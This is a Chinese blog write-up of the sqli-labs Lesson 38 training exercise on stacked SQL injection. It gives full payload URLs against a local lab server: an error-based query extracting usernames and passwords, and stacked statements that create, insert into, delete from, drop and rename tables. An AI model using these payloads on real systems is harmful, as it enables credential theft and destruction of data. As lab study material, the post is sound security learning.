---
title: sqli-labs lession-38 GET-堆叠注入
date: 2018-10-16 10:33:39
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-38 GET-堆叠注入

---

## 登录界面

![001](/img/sql/Lesson-38/001.png)

## 分析

![002](/img/sql/Lesson-38/002.png)

![003](/img/sql/Lesson-38/003.png)

![004](/img/sql/Lesson-38/004.png)

![005](/img/sql/Lesson-38/005.png)

![006](/img/sql/Lesson-38/006.png)

总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。

## 过程

跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。

`http://192.168.75.132/sql/Less-38/?id=2' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23'`

![007](/img/sql/Lesson-38/007.png)

### 增

#### 创建表

`http://192.168.75.132/sql/Less-38/?id=2';create table test like users;%23`

![008](/img/sql/Lesson-38/008.png)

#### 插入数据

`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test(id,username,password)values(100,'zhao','zhao');%23`

![009](/img/sql/Lesson-38/009.png)

![010](/img/sql/Lesson-38/010.png)

还可以将结构相同的表数据插入。

`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test select * from users%23`

![011](/img/sql/Lesson-38/011.png)

![012](/img/sql/Lesson-38/012.png)

### 删

#### 删除数据

`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;delete from test where id = 100%23`

![013](/img/sql/Lesson-38/013.png)

![014](/img/sql/Lesson-38/014.png)

#### 删除表

`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;drop table user_test;%23`

### 改

#### 修改表名

`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;alter table test rename to user_test;%23`

![015](/img/sql/Lesson-38/015.png)

![016](/img/sql/Lesson-38/016.png)










